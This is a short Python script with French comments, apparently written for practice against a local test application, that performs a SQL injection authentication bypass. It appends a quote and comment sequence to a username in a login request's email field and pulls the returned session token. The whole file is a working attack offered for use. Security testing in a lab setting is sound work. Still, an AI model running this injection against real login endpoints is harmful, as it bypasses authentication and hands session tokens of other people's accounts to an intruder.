import requests
import logging


def simulate_sql_injection(url, username, callback=None):
    """
    Exécute une injection SQL basique dans le champ 'email' d'un endpoint d'authentification.
    
    :param url: L'URL de l'endpoint API à tester (ex: http://localhost:3000/rest/user/login).
    :param username: Le nom d'utilisateur dans lequel on injecte du SQL.
    :return: Le token d'authentification s'il existe, sinon None.
    """
    payload = f"{username}'--"
    callback(f"Lancement de l'injection SQL : email = {payload}")

    try:
        response = requests.post(url, data={'email': payload, 'password': 'password'})
        callback(f"Requête envoyée à : {url}")
        callback(f"Statut de la requête : {response.status_code}")

        callback(f"Réponse brute (extrait) : {response.text[:500]}")

        try:
            token = response.json().get("authentication", {}).get("token", None)
            if token:
                callback(f"Token récupéré : {token}")
                return token
            else:
                callback("Aucun token trouvé dans la réponse.")
                return None
        except ValueError:
            callback("La réponse n'est pas au format JSON. Impossible d'extraire le token.")
            return None

    except requests.RequestException as e:
       callback(f"Erreur lors de la requête : {e}")
       return None
